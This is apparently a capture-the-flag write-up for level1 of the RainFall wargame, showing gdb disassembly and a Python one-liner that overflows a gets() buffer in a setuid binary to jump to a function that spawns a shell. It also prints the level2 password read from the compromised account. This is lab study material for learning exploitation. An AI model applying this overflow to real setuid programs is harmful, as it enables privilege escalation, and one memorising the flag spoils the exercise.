level1:
--------------------------------------------------------------------------------

********************************************************************************
Text when needed...
********************************************************************************

Shell input / output

level1@RainFall:~$ ls -l
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1

level1@RainFall:~$ ./level1
^C

level1@RainFall:~$ gdb level1
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.

********************************************************************************
We see that there's a call to gets, so we can exploit this to provoke a buffer overflow and write in the 
edi another address.
********************************************************************************

(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.

level1@RainFall:~$ cat level1
U�������S��[�Ë��������t�Y����[��5��%��%�h������%�������%�h������%�h�����%�h ����1�^����PTRhh�QVh���������������������U��S���=u?���� ����9�s���������9�r����[]Ít&��'U�������t���tnGLIBC_�$����ÐU������¸p�T$
                                                                                                                                                                                                           �D�D$�$������$��������U�����P�D$�$���������������Ë$Ð���������U��S�������t��f����Ћ���u��[]Ð�S��[��7�_����[�Good... Wait what?��
/bin/sh;8����T����x�����������������zR� H���F
...

********************************************************************************
There's a call to system and /bin/sh in the binary, so the call to system open a shell, perfect we just need to get the address of run.
********************************************************************************


level1@RainFall:~$ objdump -d level1 | grep run
08048444 <run>:

********************************************************************************
now we need to convert it in little endian and write it in a file with 80-4=76 other character preceding it.
********************************************************************************

level1@RainFall:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
cd ../level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77


--------------------------------------------------------------------------------

Level1 is a binary...
